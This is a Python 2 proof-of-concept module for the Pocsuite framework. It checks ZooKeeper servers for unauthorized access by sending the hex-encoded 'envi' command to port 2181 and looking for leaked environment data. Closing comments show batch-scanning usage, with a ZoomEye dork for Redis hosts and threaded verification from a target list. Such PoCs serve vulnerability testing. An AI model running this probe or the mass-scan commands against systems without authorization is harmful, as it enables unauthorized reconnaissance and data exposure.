#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class ZooKeeperPOC(POCBase):
    vulID = '27'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-05-11' #漏洞公开的时间,不知道就写今天

    author = 'wangqi' #  PoC作者的大名
    createDate = '2018-05-11'# 编写 PoC 的日期
    updateDate = '2018-05-11'# PoC 更新的时间,默认和编写时间一样
    references = 'http://www.52bug.cn/黑客技术/3905.html'# 漏洞地址来源,0day不用写
    name = 'ZooKeeper Unauthorized access'# PoC 名称
    appPowerLink = 'http://zookeeper.apache.org/'# 漏洞厂商主页地址
    appName = 'ZooKeeper'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'Information Disclosure'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        ZooKeeper 未授权访问漏洞
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 27-ZooKeeper-unauthorized-access.py -u 127.0.0.1 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        vul_url = '%s' % self.url
        #如果设置端口则取端口,没有设置则为默认端口
        import re
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = 2181
        payload = '\x65\x6e\x76\x69'
        #检测漏洞
        import socket
        s = socket.socket()
        socket.setdefaulttimeout(5)
        try:
            s.connect((_host, _port))
            s.send(payload)
            recvdata = s.recv(2048)
            # print recvdata
            if 'Environment' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            # return host
            print e
            pass
        s.close()
        print '[+]27 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(ZooKeeperPOC)











"""
PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md

使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md

集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md


钟馗之眼 批量验证
pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html


pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html

"""